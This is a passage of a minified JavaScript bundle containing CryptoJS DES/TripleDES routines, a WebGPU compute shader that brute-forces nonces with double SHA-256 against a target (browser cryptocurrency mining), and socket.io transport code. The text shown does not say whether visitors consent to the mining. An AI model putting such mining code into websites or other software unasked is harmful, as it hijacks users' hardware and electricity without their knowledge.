                            1572864: 2151682112,
                            1638400: 2147483648,
                            1703936: 2151677952,
                            1769472: 4198464,
                            1835008: 2147487744,
                            1900544: 4194304,
                            1966080: 64,
                            2031616: 4096,
                            1081344: 2151677952,
                            1146880: 2151682112,
                            1212416: 0,
                            1277952: 4198400,
                            1343488: 4194368,
                            1409024: 2147483648,
                            1474560: 2147487808,
                            1540096: 64,
                            1605632: 2147483712,
                            1671168: 4096,
                            1736704: 2147487744,
                            1802240: 2151678016,
                            1867776: 4160,
                            1933312: 2151682048,
                            1998848: 4194304,
                            2064384: 4198464
                        }, {
                            0: 128,
                            4096: 17039360,
                            8192: 262144,
                            12288: 536870912,
                            16384: 537133184,
                            20480: 16777344,
                            24576: 553648256,
                            28672: 262272,
                            32768: 16777216,
                            36864: 537133056,
                            40960: 536871040,
                            45056: 553910400,
                            49152: 553910272,
                            53248: 0,
                            57344: 17039488,
                            61440: 553648128,
                            2048: 17039488,
                            6144: 553648256,
                            10240: 128,
                            14336: 17039360,
                            18432: 262144,
                            22528: 537133184,
                            26624: 553910272,
                            30720: 536870912,
                            34816: 537133056,
                            38912: 0,
                            43008: 553910400,
                            47104: 16777344,
                            51200: 536871040,
                            55296: 553648128,
                            59392: 16777216,
                            63488: 262272,
                            65536: 262144,
                            69632: 128,
                            73728: 536870912,
                            77824: 553648256,
                            81920: 16777344,
                            86016: 553910272,
                            90112: 537133184,
                            94208: 16777216,
                            98304: 553910400,
                            102400: 553648128,
                            106496: 17039360,
                            110592: 537133056,
                            114688: 262272,
                            118784: 536871040,
                            122880: 0,
                            126976: 17039488,
                            67584: 553648256,
                            71680: 16777216,
                            75776: 17039360,
                            79872: 537133184,
                            83968: 536870912,
                            88064: 17039488,
                            92160: 128,
                            96256: 553910272,
                            100352: 262272,
                            104448: 553910400,
                            108544: 0,
                            112640: 553648128,
                            116736: 16777344,
                            120832: 262144,
                            124928: 537133056,
                            129024: 536871040
                        }, {
                            0: 268435464,
                            256: 8192,
                            512: 270532608,
                            768: 270540808,
                            1024: 268443648,
                            1280: 2097152,
                            1536: 2097160,
                            1792: 268435456,
                            2048: 0,
                            2304: 268443656,
                            2560: 2105344,
                            2816: 8,
                            3072: 270532616,
                            3328: 2105352,
                            3584: 8200,
                            3840: 270540800,
                            128: 270532608,
                            384: 270540808,
                            640: 8,
                            896: 2097152,
                            1152: 2105352,
                            1408: 268435464,
                            1664: 268443648,
                            1920: 8200,
                            2176: 2097160,
                            2432: 8192,
                            2688: 268443656,
                            2944: 270532616,
                            3200: 0,
                            3456: 270540800,
                            3712: 2105344,
                            3968: 268435456,
                            4096: 268443648,
                            4352: 270532616,
                            4608: 270540808,
                            4864: 8200,
                            5120: 2097152,
                            5376: 268435456,
                            5632: 268435464,
                            5888: 2105344,
                            6144: 2105352,
                            6400: 0,
                            6656: 8,
                            6912: 270532608,
                            7168: 8192,
                            7424: 268443656,
                            7680: 270540800,
                            7936: 2097160,
                            4224: 8,
                            4480: 2105344,
                            4736: 2097152,
                            4992: 268435464,
                            5248: 268443648,
                            5504: 8200,
                            5760: 270540808,
                            6016: 270532608,
                            6272: 270540800,
                            6528: 270532616,
                            6784: 8192,
                            7040: 2105352,
                            7296: 2097160,
                            7552: 0,
                            7808: 268435456,
                            8064: 268443656
                        }, {
                            0: 1048576,
                            16: 33555457,
                            32: 1024,
                            48: 1049601,
                            64: 34604033,
                            80: 0,
                            96: 1,
                            112: 34603009,
                            128: 33555456,
                            144: 1048577,
                            160: 33554433,
                            176: 34604032,
                            192: 34603008,
                            208: 1025,
                            224: 1049600,
                            240: 33554432,
                            8: 34603009,
                            24: 0,
                            40: 33555457,
                            56: 34604032,
                            72: 1048576,
                            88: 33554433,
                            104: 33554432,
                            120: 1025,
                            136: 1049601,
                            152: 33555456,
                            168: 34603008,
                            184: 1048577,
                            200: 1024,
                            216: 34604033,
                            232: 1,
                            248: 1049600,
                            256: 33554432,
                            272: 1048576,
                            288: 33555457,
                            304: 34603009,
                            320: 1048577,
                            336: 33555456,
                            352: 34604032,
                            368: 1049601,
                            384: 1025,
                            400: 34604033,
                            416: 1049600,
                            432: 1,
                            448: 0,
                            464: 34603008,
                            480: 33554433,
                            496: 1024,
                            264: 1049600,
                            280: 33555457,
                            296: 34603009,
                            312: 1,
                            328: 33554432,
                            344: 1048576,
                            360: 1025,
                            376: 34604032,
                            392: 33554433,
                            408: 34603008,
                            424: 0,
                            440: 34604033,
                            456: 1049601,
                            472: 1024,
                            488: 33555456,
                            504: 1048577
                        }, {
                            0: 134219808,
                            1: 131072,
                            2: 134217728,
                            3: 32,
                            4: 131104,
                            5: 134350880,
                            6: 134350848,
                            7: 2048,
                            8: 134348800,
                            9: 134219776,
                            10: 133120,
                            11: 134348832,
                            12: 2080,
                            13: 0,
                            14: 134217760,
                            15: 133152,
                            2147483648: 2048,
                            2147483649: 134350880,
                            2147483650: 134219808,
                            2147483651: 134217728,
                            2147483652: 134348800,
                            2147483653: 133120,
                            2147483654: 133152,
                            2147483655: 32,
                            2147483656: 134217760,
                            2147483657: 2080,
                            2147483658: 131104,
                            2147483659: 134350848,
                            2147483660: 0,
                            2147483661: 134348832,
                            2147483662: 134219776,
                            2147483663: 131072,
                            16: 133152,
                            17: 134350848,
                            18: 32,
                            19: 2048,
                            20: 134219776,
                            21: 134217760,
                            22: 134348832,
                            23: 131072,
                            24: 0,
                            25: 131104,
                            26: 134348800,
                            27: 134219808,
                            28: 134350880,
                            29: 133120,
                            30: 2080,
                            31: 134217728,
                            2147483664: 131072,
                            2147483665: 2048,
                            2147483666: 134348832,
                            2147483667: 133152,
                            2147483668: 32,
                            2147483669: 134348800,
                            2147483670: 134217728,
                            2147483671: 134219808,
                            2147483672: 134350880,
                            2147483673: 134217760,
                            2147483674: 134219776,
                            2147483675: 0,
                            2147483676: 133120,
                            2147483677: 2080,
                            2147483678: 131104,
                            2147483679: 134350848
                        }],
                        W = [4160749569, 528482304, 33030144, 2064384, 129024, 8064, 504, 2147483679],
                        S = V.DES = R.extend({
                            _doReset: function() {
                                for (var U = this._key.words, F = [], Q = 0; Q < 56; Q++) {
                                    var B = l[Q] - 1;
                                    F[Q] = U[B >>> 5] >>> 31 - B % 32 & 1
                                }
                                for (var R = this._subKeys = [], V = 0; V < 16; V++) {
                                    var Z = R[V] = [],
                                        W = d[V];
                                    for (Q = 0; Q < 24; Q++) Z[Q / 6 | 0] |= F[(N[Q] - 1 + W) % 28] << 31 - Q % 6, Z[4 + (Q / 6 | 0)] |= F[28 + (N[Q + 24] - 1 + W) % 28] << 31 - Q % 6;
                                    for (Z[0] = Z[0] << 1 | Z[0] >>> 31, Q = 1; Q < 7; Q++) Z[Q] = Z[Q] >>> 4 * (Q - 1) + 3;
                                    Z[7] = Z[7] << 5 | Z[7] >>> 27
                                }
                                var S = this._invSubKeys = [];
                                for (Q = 0; Q < 16; Q++) S[Q] = R[15 - Q]
                            },
                            encryptBlock: function(U, F) {
                                this._doCryptBlock(U, F, this._subKeys)
                            },
                            decryptBlock: function(U, F) {
                                this._doCryptBlock(U, F, this._invSubKeys)
                            },
                            _doCryptBlock: function(U, F, Q) {
                                this._lBlock = U[F], this._rBlock = U[F + 1], J.call(this, 4, 252645135), J.call(this, 16, 65535), E.call(this, 2, 858993459), E.call(this, 8, 16711935), J.call(this, 1, 1431655765);
                                for (var B = 0; B < 16; B++) {
                                    for (var R = Q[B], V = this._lBlock, l = this._rBlock, N = 0, d = 0; d < 8; d++) N |= Z[d][((l ^ R[d]) & W[d]) >>> 0];
                                    this._lBlock = l, this._rBlock = V ^ N
                                }
                                var S = this._lBlock;
                                this._lBlock = this._rBlock, this._rBlock = S, J.call(this, 1, 1431655765), E.call(this, 8, 16711935), E.call(this, 2, 858993459), J.call(this, 16, 65535), J.call(this, 4, 252645135), U[F] = this._lBlock, U[F + 1] = this._rBlock
                            },
                            keySize: 2,
                            ivSize: 2,
                            blockSize: 2
                        });

                    function J(U, F) {
                        var Q = (this._lBlock >>> U ^ this._rBlock) & F;
                        this._rBlock ^= Q, this._lBlock ^= Q << U
                    }

                    function E(U, F) {
                        var Q = (this._rBlock >>> U ^ this._lBlock) & F;
                        this._lBlock ^= Q, this._rBlock ^= Q << U
                    }
                    U.DES = R._createHelper(S);
                    var T = V.TripleDES = R.extend({
                        _doReset: function() {
                            var U = this._key.words;
                            if (2 !== U.length && 4 !== U.length && U.length < 6) throw new Error("Invalid key length - 3DES requires the key length to be 64, 128, 192 or >192.");
                            var F = U.slice(0, 2),
                                B = U.length < 4 ? U.slice(0, 2) : U.slice(2, 4),
                                R = U.length < 6 ? U.slice(0, 2) : U.slice(4, 6);
                            this._des1 = S.createEncryptor(Q.create(F)), this._des2 = S.createEncryptor(Q.create(B)), this._des3 = S.createEncryptor(Q.create(R))
                        },
                        encryptBlock: function(U, F) {
                            this._des1.encryptBlock(U, F), this._des2.decryptBlock(U, F), this._des3.encryptBlock(U, F)
                        },
                        decryptBlock: function(U, F) {
                            this._des3.decryptBlock(U, F), this._des2.encryptBlock(U, F), this._des1.decryptBlock(U, F)
                        },
                        keySize: 6,
                        ivSize: 2,
                        blockSize: 2
                    });
                    U.TripleDES = R._createHelper(T)
                }(), B.TripleDES)
            },
            240: function(U, F, Q) {
                var B, R, V, l, N, d;
                U.exports = (B = Q(21), V = (R = B).lib, l = V.Base, N = V.WordArray, (d = R.x64 = {}).Word = l.extend({
                    init: function(U, F) {
                        this.high = U, this.low = F
                    }
                }), d.WordArray = l.extend({
                    init: function(U, F) {
                        U = this.words = U || [], this.sigBytes = null != F ? F : 8 * U.length
                    },
                    toX32: function() {
                        for (var U = this.words, F = U.length, Q = [], B = 0; B < F; B++) {
                            var R = U[B];
                            Q.push(R.high), Q.push(R.low)
                        }
                        return N.create(Q, this.sigBytes)
                    },
                    clone: function() {
                        for (var U = l.clone.call(this), F = U.words = this.words.slice(0), Q = F.length, B = 0; B < Q; B++) F[B] = F[B].clone();
                        return U
                    }
                }), B)
            },
            477: () => {}
        },
        F = {};

    function Q(B) {
        var R = F[B];
        if (void 0 !== R) return R.exports;
        var V = F[B] = {
            exports: {}
        };
        return U[B].call(V.exports, V, V.exports, Q), V.exports
    }
    Q.n = U => {
        var F = U && U.__esModule ? () => U.default : () => U;
        return Q.d(F, {
            a: F
        }), F
    }, Q.d = (U, F) => {
        for (var B in F) Q.o(F, B) && !Q.o(U, B) && Object.defineProperty(U, B, {
            enumerable: !0,
            get: F[B]
        })
    }, Q.g = function() {
        if ("object" == typeof globalThis) return globalThis;
        try {
            return this || new Function("return this")()
        } catch (U) {
            if ("object" == typeof window) return window
        }
    }(), Q.o = (U, F) => Object.prototype.hasOwnProperty.call(U, F), Q.r = U => {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(U, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(U, "__esModule", {
            value: !0
        })
    }, (() => {
        "use strict";
        var U = {};
        Q.r(U), Q.d(U, {
            Decoder: () => aU,
            Encoder: () => kU,
            PacketType: () => nU,
            protocol: () => TU
        });
        class F {#
            U;#
            F;#
            Q = [];
            static instance = null;
            async init() {
                return this.#U = await async function() {
                    const U = await navigator.gpu.requestAdapter({
                        powerPreference: "high-performance"
                    });
                    if (U) return await U.requestDevice();
                    throw "No adapter"
                }(), this.#F = this.#U.createComputePipeline({
                    compute: {
                        module: this.#U.createShaderModule({
                            code: "const HEADER_OFFSET = 2;\nconst TARGET_OFFSET = 22;\nconst RESULT_OFFSET = 30;\n\nfn swap_endianess32(val: u32) -> u32 {\n    return ((val>>24u) & 0xffu) | ((val>>8u) & 0xff00u) | ((val<<8u) & 0xff0000u) | ((val<<24u) & 0xff000000u);\n}\n\nfn shw(x: u32, n: u32) -> u32 {\n    return x << (n & 31u);\n}\n\nfn r(x: u32, n: u32) -> u32 {\n    return (x >> n) | shw(x, 32u - n);\n}\n\nfn g0(x: u32) -> u32 {\n    return r(x, 7u) ^ r(x, 18u) ^ (x >> 3u);\n}\n\nfn g1(x: u32) -> u32 {\n    return r(x, 17u) ^ r(x, 19u) ^ (x >> 10u);\n}\n\nfn s0(x: u32) -> u32 {\n    return r(x, 2u) ^ r(x, 13u) ^ r(x, 22u);\n}\n\nfn s1(x: u32) -> u32 {\n    return r(x, 6u) ^ r(x, 11u) ^ r(x, 25u);\n}\n\nfn maj(a: u32, b: u32, c: u32) -> u32 {\n    return (a & b) ^ (a & c) ^ (b & c);\n}\n\nfn ch(e: u32, f: u32, g: u32) -> u32 {\n    return (e & f) ^ ((~e) & g);\n}\n\nfn get_sizes(num_bytes: u32) -> array<u32,2> {\n    let lenBit = num_bytes * 8;\n    let k = 512 - (lenBit + 1 + 64) % 512;\n    let padding = 1 + k + 64;\n    let lenBitPadded = lenBit + padding;\n    return array<u32,2>(lenBit / 32, lenBitPadded / 32);\n}\n\nconst k = array<u32,64>(\n        0x428a2f98u, 0x71374491u, 0xb5c0fbcfu, 0xe9b5dba5u, 0x3956c25bu, 0x59f111f1u, 0x923f82a4u, 0xab1c5ed5u,\n        0xd807aa98u, 0x12835b01u, 0x243185beu, 0x550c7dc3u, 0x72be5d74u, 0x80deb1feu, 0x9bdc06a7u, 0xc19bf174u,\n        0xe49b69c1u, 0xefbe4786u, 0x0fc19dc6u, 0x240ca1ccu, 0x2de92c6fu, 0x4a7484aau, 0x5cb0a9dcu, 0x76f988dau,\n        0x983e5152u, 0xa831c66du, 0xb00327c8u, 0xbf597fc7u, 0xc6e00bf3u, 0xd5a79147u, 0x06ca6351u, 0x14292967u,\n        0x27b70a85u, 0x2e1b2138u, 0x4d2c6dfcu, 0x53380d13u, 0x650a7354u, 0x766a0abbu, 0x81c2c92eu, 0x92722c85u,\n        0xa2bfe8a1u, 0xa81a664bu, 0xc24b8b70u, 0xc76c51a3u, 0xd192e819u, 0xd6990624u, 0xf40e3585u, 0x106aa070u,\n        0x19a4c116u, 0x1e376c08u, 0x2748774cu, 0x34b0bcb5u, 0x391c0cb3u, 0x4ed8aa4au, 0x5b9cca4fu, 0x682e6ff3u,\n        0x748f82eeu, 0x78a5636fu, 0x84c87814u, 0x8cc70208u, 0x90befffau, 0xa4506cebu, 0xbef9a3f7u, 0xc67178f2u\n);\n\nfn sha256_1(nonce: u32) -> array<u32,8> {\n\n    var message_pad = array<u32,32>();\n    for (var i = 0u; i < 20; i++) {\n        message_pad[i] = args[HEADER_OFFSET + i];\n    }\n    message_pad[19] = nonce;\n\n    // == padding == //\n\n    message_pad[20] = 0x00000080u;\n    for (var i = 20 + 1; i < 32 - 2; i++){\n        message_pad[i] = 0x00000000u;\n    }\n    message_pad[32 - 2] = 0;\n    message_pad[32 - 1] = swap_endianess32(20 * 32u);\n\n    // == processing == //\n\n    var hash = array<u32,8>();\n\n    hash[0] = 0x6a09e667u;\n    hash[1] = 0xbb67ae85u;\n    hash[2] = 0x3c6ef372u;\n    hash[3] = 0xa54ff53au;\n    hash[4] = 0x510e527fu;\n    hash[5] = 0x9b05688cu;\n    hash[6] = 0x1f83d9abu;\n    hash[7] = 0x5be0cd19u;\n\n    let num_chunks = (32 * 32u) / 512u;\n    for (var i = 0u; i < num_chunks; i++){\n        let chunk_index = i * (512u/32u);\n        var w = array<u32,64>();\n        for (var j = 0u; j < 16u; j++){\n            w[j] = swap_endianess32(message_pad[chunk_index + j]);\n        }\n        for (var j = 16u; j < 64u; j++){\n            w[j] = w[j - 16u] + g0(w[j - 15u]) + w[j - 7u] + g1(w[j - 2u]);\n        }\n        var a = hash[0];\n        var b = hash[1];\n        var c = hash[2];\n        var d = hash[3];\n        var e = hash[4];\n        var f = hash[5];\n        var g = hash[6];\n        var h = hash[7];\n        for (var j = 0u; j < 64u; j++){\n            let t2 = s0(a) + maj(a, b, c);\n            let t1 = h + s1(e) + ch(e, f, g) + k[j] + w[j];\n            h = g;\n            g = f;\n            f = e;\n            e = d + t1;\n            d = c;\n            c = b;\n            b = a;\n            a = t1 + t2;\n        }\n        hash[0] += a;\n        hash[1] += b;\n        hash[2] += c;\n        hash[3] += d;\n        hash[4] += e;\n        hash[5] += f;\n        hash[6] += g;\n        hash[7] += h;\n    }\n    hash[0] = swap_endianess32(hash[0]);\n    hash[1] = swap_endianess32(hash[1]);\n    hash[2] = swap_endianess32(hash[2]);\n    hash[3] = swap_endianess32(hash[3]);\n    hash[4] = swap_endianess32(hash[4]);\n    hash[5] = swap_endianess32(hash[5]);\n    hash[6] = swap_endianess32(hash[6]);\n    hash[7] = swap_endianess32(hash[7]);\n\n    return hash;\n}\n\nfn sha256_2(message: array<u32,8>) -> array<u32,8> {\n\n    var message_pad = array<u32,16>();\n    for (var i = 0u; i < 8; i++) {\n        message_pad[i] = message[i];\n    }\n\n    // == padding == //\n\n    message_pad[8] = 0x00000080u;\n    for (var i = 8 + 1; i < 16 - 2; i++){\n        message_pad[i] = 0x00000000u;\n    }\n    message_pad[16 - 2] = 0;\n    message_pad[16 - 1] = swap_endianess32(8 * 32u);\n\n    // == processing == //\n\n    var hash = array<u32,8>();\n\n    hash[0] = 0x6a09e667u;\n    hash[1] = 0xbb67ae85u;\n    hash[2] = 0x3c6ef372u;\n    hash[3] = 0xa54ff53au;\n    hash[4] = 0x510e527fu;\n    hash[5] = 0x9b05688cu;\n    hash[6] = 0x1f83d9abu;\n    hash[7] = 0x5be0cd19u;\n\n    let num_chunks = (16 * 32u) / 512u;\n    for (var i = 0u; i < num_chunks; i++){\n        let chunk_index = i * (512u/32u);\n        var w = array<u32,64>();\n        for (var j = 0u; j < 16u; j++){\n            w[j] = swap_endianess32(message_pad[chunk_index + j]);\n        }\n        for (var j = 16u; j < 64u; j++){\n            w[j] = w[j - 16u] + g0(w[j - 15u]) + w[j - 7u] + g1(w[j - 2u]);\n        }\n        var a = hash[0];\n        var b = hash[1];\n        var c = hash[2];\n        var d = hash[3];\n        var e = hash[4];\n        var f = hash[5];\n        var g = hash[6];\n        var h = hash[7];\n        for (var j = 0u; j < 64u; j++){\n            let t2 = s0(a) + maj(a, b, c);\n            let t1 = h + s1(e) + ch(e, f, g) + k[j] + w[j];\n            h = g;\n            g = f;\n            f = e;\n            e = d + t1;\n            d = c;\n            c = b;\n            b = a;\n            a = t1 + t2;\n        }\n        hash[0] += a;\n        hash[1] += b;\n        hash[2] += c;\n        hash[3] += d;\n        hash[4] += e;\n        hash[5] += f;\n        hash[6] += g;\n        hash[7] += h;\n    }\n    hash[0] = swap_endianess32(hash[0]);\n    hash[1] = swap_endianess32(hash[1]);\n    hash[2] = swap_endianess32(hash[2]);\n    hash[3] = swap_endianess32(hash[3]);\n    hash[4] = swap_endianess32(hash[4]);\n    hash[5] = swap_endianess32(hash[5]);\n    hash[6] = swap_endianess32(hash[6]);\n    hash[7] = swap_endianess32(hash[7]);\n\n    return hash;\n}\n\nfn check(hash: array<u32,8>) -> u32 {\n\n    for (var i = 0u; i < 8u; i++) {\n        if (hash[i] < args[TARGET_OFFSET + i]) {\n            return 1u;\n        }\n        else if (hash[i] > args[TARGET_OFFSET + i]) {\n            return 0u;\n        }\n    }\n\n    return 0u;\n}\n\n@group(0) @binding(0) var<storage, read_write> args: array<u32>;\n\n@compute @workgroup_size(<workgroup_size>)\nfn sha256d(@builtin(global_invocation_id) global_id: vec3<u32>) {\n\n    let index = global_id.x;\n    let num_nonces = args[1];\n    var nonce = args[0] + (index * num_nonces);\n    \n    var res = 0u;\n    var i = 0u;\n    while (i < num_nonces) {\n        let hash = sha256_2(sha256_1(nonce));\n        // un'ottimizzazione è spostare questa inversione sul target sul client\n        var hash2 = array<u32,8>();\n        hash2[0] = hash[7];\n        hash2[1] = hash[6];\n        hash2[2] = hash[5];\n        hash2[3] = hash[4];\n        hash2[4] = hash[3];\n        hash2[5] = hash[2];\n        hash2[6] = hash[1];\n        hash2[7] = hash[0];\n        res |= check(hash2) << i;\n        nonce += 1u;\n        i += 1u;\n    }\n    if (res != 0u) {\n        args[RESULT_OFFSET] = 1u;\n    }\n    args[index + RESULT_OFFSET + 1] = res;\n}".replace("<workgroup_size>", this.#U.limits.maxComputeWorkgroupSizeX)
                        }),
                        entryPoint: "sha256d"
                    },
                    layout: "auto"
                }), this
            }
            get device() {
                return this.#U
            }
            get computePipeline() {
                return this.#F
            }
            createBuffer(U) {
                const F = this.#U.createBuffer(U);
                return this.#Q.push(F), F
            }
            destroyBuffers() {
                for (const U of this.#Q) U.destroy();
                this.#Q = []
            }
            static async init() {
                F.instance = F.instance ? F.instance : await (new F).init()
            }
            static destroy() {
                F.instance && (F.instance.destroyBuffers(), F.instance.device.destroy()), F.instance = null
            }
        }
        async function B() {
            return await F.init(), Math.floor(F.instance.device.limits.maxComputeWorkgroupsPerDimension / 100)
        }
        async function R() {
            return await F.init(), await B() * F.instance.device.limits.maxComputeWorkgroupSizeX
        }
        const V = 2 ** 32,
            l = Object.create(null);
        l.open = "0", l.close = "1", l.ping = "2", l.pong = "3", l.message = "4", l.upgrade = "5", l.noop = "6";
        const N = Object.create(null);
        Object.keys(l).forEach((U => {
            N[l[U]] = U
        }));
        const d = {
                type: "error",
                data: "parser error"
            },
            Z = "function" == typeof Blob || "undefined" != typeof Blob && "[object BlobConstructor]" === Object.prototype.toString.call(Blob),
            W = "function" == typeof ArrayBuffer,
            S = U => "function" == typeof ArrayBuffer.isView ? ArrayBuffer.isView(U) : U && U.buffer instanceof ArrayBuffer,
            J = ({
                type: U,
                data: F
            }, Q, B) => Z && F instanceof Blob ? Q ? B(F) : E(F, B) : W && (F instanceof ArrayBuffer || S(F)) ? Q ? B(F) : E(new Blob([F]), B) : B(l[U] + (F || "")),
            E = (U, F) => {
                const Q = new FileReader;
                return Q.onload = function() {
                    const U = Q.result.split(",")[1];
                    F("b" + (U || ""))
                }, Q.readAsDataURL(U)
            };

        function T(U) {
            return U instanceof Uint8Array ? U : U instanceof ArrayBuffer ? new Uint8Array(U) : new Uint8Array(U.buffer, U.byteOffset, U.byteLength)
        }
        let n;
        const k = "undefined" == typeof Uint8Array ? [] : new Uint8Array(256);
        for (let U = 0; U < 64; U++) k["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charCodeAt(U)] = U;
        const M = "function" == typeof ArrayBuffer,
            a = (U, F) => {
                if ("string" != typeof U) return {
                    type: "message",
                    data: h(U, F)
                };
                const Q = U.charAt(0);
                return "b" === Q ? {
                    type: "message",
                    data: D(U.substring(1), F)
                } : N[Q] ? U.length > 1 ? {
                    type: N[Q],
                    data: U.substring(1)
                } : {
                    type: N[Q]
                } : d
            },
            D = (U, F) => {
                if (M) {
                    const Q = (U => {
                        let F, Q, B, R, V, l = .75 * U.length,
                            N = U.length,
                            d = 0;
                        "=" === U[U.length - 1] && (l--, "=" === U[U.length - 2] && l--);
                        const Z = new ArrayBuffer(l),
                            W = new Uint8Array(Z);
                        for (F = 0; F < N; F += 4) Q = k[U.charCodeAt(F)], B = k[U.charCodeAt(F + 1)], R = k[U.charCodeAt(F + 2)], V = k[U.charCodeAt(F + 3)], W[d++] = Q << 2 | B >> 4, W[d++] = (15 & B) << 4 | R >> 2, W[d++] = (3 & R) << 6 | 63 & V;
                        return Z
                    })(U);
                    return h(Q, F)
                }
                return {
                    base64: !0,
                    data: U
                }
            },
            h = (U, F) => "blob" === F ? U instanceof Blob ? U : new Blob([U]) : U instanceof ArrayBuffer ? U : U.buffer,
            p = String.fromCharCode(30);
        let t;

        function Y(U) {
            return U.reduce(((U, F) => U + F.length), 0)
        }

        function c(U, F) {
            if (U[0].length === F) return U.shift();
            const Q = new Uint8Array(F);
            let B = 0;
            for (let R = 0; R < F; R++) Q[R] = U[0][B++], B === U[0].length && (U.shift(), B = 0);
            return U.length && B < U[0].length && (U[0] = U[0].slice(B)), Q
        }

        function e(U) {
            if (U) return function(U) {
                for (var F in e.prototype) U[F] = e.prototype[F];
                return U
            }(U)
        }
        e.prototype.on = e.prototype.addEventListener = function(U, F) {
            return this._callbacks = this._callbacks || {}, (this._callbacks["$" + U] = this._callbacks["$" + U] || []).push(F), this
        }, e.prototype.once = function(U, F) {
            function Q() {
                this.off(U, Q), F.apply(this, arguments)
            }
            return Q.fn = F, this.on(U, Q), this
        }, e.prototype.off = e.prototype.removeListener = e.prototype.removeAllListeners = e.prototype.removeEventListener = function(U, F) {
            if (this._callbacks = this._callbacks || {}, 0 == arguments.length) return this._callbacks = {}, this;
            var Q, B = this._callbacks["$" + U];
            if (!B) return this;
            if (1 == arguments.length) return delete this._callbacks["$" + U], this;
            for (var R = 0; R < B.length; R++)
                if ((Q = B[R]) === F || Q.fn === F) {
                    B.splice(R, 1);
                    break
                }
            return 0 === B.length && delete this._callbacks["$" + U], this
        }, e.prototype.emit = function(U) {
            this._callbacks = this._callbacks || {};
            for (var F = new Array(arguments.length - 1), Q = this._callbacks["$" + U], B = 1; B < arguments.length; B++) F[B - 1] = arguments[B];
            if (Q) {
                B = 0;
                for (var R = (Q = Q.slice(0)).length; B < R; ++B) Q[B].apply(this, F)
            }
            return this
        }, e.prototype.emitReserved = e.prototype.emit, e.prototype.listeners = function(U) {
            return this._callbacks = this._callbacks || {}, this._callbacks["$" + U] || []
        }, e.prototype.hasListeners = function(U) {
            return !!this.listeners(U).length
        };
        const m = "undefined" != typeof self ? self : "undefined" != typeof window ? window : Function("return this")();

        function G(U, ...F) {
            return F.reduce(((F, Q) => (U.hasOwnProperty(Q) && (F[Q] = U[Q]), F)), {})
        }
        const z = m.setTimeout,
            j = m.clearTimeout;

        function C(U, F) {
            F.useNativeTimers ? (U.setTimeoutFn = z.bind(m), U.clearTimeoutFn = j.bind(m)) : (U.setTimeoutFn = m.setTimeout.bind(m), U.clearTimeoutFn = m.clearTimeout.bind(m))
        }
        class X extends Error {
            constructor(U, F, Q) {
                super(U), this.description = F, this.context = Q, this.type = "TransportError"
            }
        }
        class O extends e {
            constructor(U) {
                super(), this.writable = !1, C(this, U), this.opts = U, this.query = U.query, this.socket = U.socket
            }
            onError(U, F, Q) {
                return super.emitReserved("error", new X(U, F, Q)), this
            }
            open() {
                return this.readyState = "opening", this.doOpen(), this
            }
            close() {
                return "opening" !== this.readyState && "open" !== this.readyState || (this.doClose(), this.onClose()), this
            }
            send(U) {
                "open" === this.readyState && this.write(U)
            }
            onOpen() {
                this.readyState = "open", this.writable = !0, super.emitReserved("open")
            }
            onData(U) {
                const F = a(U, this.socket.binaryType);
                this.onPacket(F)
            }
            onPacket(U) {
                super.emitReserved("packet", U)
            }
            onClose(U) {
                this.readyState = "closed", super.emitReserved("close", U)
            }
            pause(U) {}
            createUri(U, F = {}) {
                return U + "://" + this._hostname() + this._port() + this.opts.path + this._query(F)
            }
            _hostname() {
                const U = this.opts.hostname;
                return -1 === U.indexOf(":") ? U : "[" + U + "]"
            }
            _port() {
                return this.opts.port && (this.opts.secure && Number(443 !== this.opts.port) || !this.opts.secure && 80 !== Number(this.opts.port)) ? ":" + this.opts.port : ""
            }
            _query(U) {
                const F = function(U) {
                    let F = "";
                    for (let Q in U) U.hasOwnProperty(Q) && (F.length && (F += "&"), F += encodeURIComponent(Q) + "=" + encodeURIComponent(U[Q]));
                    return F
                }(U);
                return F.length ? "?" + F : ""
            }
        }
        const b = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_".split(""),
            L = 64,
            x = {};
        let o, I = 0,
            r = 0;

        function w(U) {
            let F = "";
            do {
                F = b[U % L] + F, U = Math.floor(U / L)
            } while (U > 0);
            return F
        }

        function s() {
            const U = w(+new Date);
            return U !== o ? (I = 0, o = U) : U + "." + w(I++)
        }
        for (; r < L; r++) x[b[r]] = r;
        let y = !1;
        try {
            y = "undefined" != typeof XMLHttpRequest && "withCredentials" in new XMLHttpRequest
        } catch (U) {}
        const v = y;

        function H(U) {
            const F = U.xdomain;
            try {
                if ("undefined" != typeof XMLHttpRequest && (!F || v)) return new XMLHttpRequest
            } catch (U) {}
            if (!F) try {
                return new(m[["Active"].concat("Object").join("X")])("Microsoft.XMLHTTP")
            } catch (U) {}
        }

        function i() {}
        const K = null != new H({
            xdomain: !1
        }).responseType;
        class u extends e {
            constructor(U, F) {
                super(), C(this, F), this.opts = F, this.method = F.method || "GET", this.uri = U, this.data = void 0 !== F.data ? F.data : null, this.create()
            }
            create() {
                var U;
                const F = G(this.opts, "agent", "pfx", "key", "passphrase", "cert", "ca", "ciphers", "rejectUnauthorized", "autoUnref");
                F.xdomain = !!this.opts.xd;
                const Q = this.xhr = new H(F);
                try {
                    Q.open(this.method, this.uri, !0);
                    try {
                        if (this.opts.extraHeaders) {
                            Q.setDisableHeaderCheck && Q.setDisableHeaderCheck(!0);
                            for (let U in this.opts.extraHeaders) this.opts.extraHeaders.hasOwnProperty(U) && Q.setRequestHeader(U, this.opts.extraHeaders[U])
                        }
                    } catch (U) {}
                    if ("POST" === this.method) try {
                        Q.setRequestHeader("Content-type", "text/plain;charset=UTF-8")
                    } catch (U) {}
                    try {
                        Q.setRequestHeader("Accept", "*/*")
                    } catch (U) {}
                    null === (U = this.opts.cookieJar) || void 0 === U || U.addCookies(Q), "withCredentials" in Q && (Q.withCredentials = this.opts.withCredentials), this.opts.requestTimeout && (Q.timeout = this.opts.requestTimeout), Q.onreadystatechange = () => {
                        var U;
                        3 === Q.readyState && (null === (U = this.opts.cookieJar) || void 0 === U || U.parseCookies(Q)), 4 === Q.readyState && (200 === Q.status || 1223 === Q.status ? this.onLoad() : this.setTimeoutFn((() => {
                            this.onError("number" == typeof Q.status ? Q.status : 0)
                        }), 0))
                    }, Q.send(this.data)
                } catch (U) {
                    return void this.setTimeoutFn((() => {
                        this.onError(U)
                    }), 0)
                }
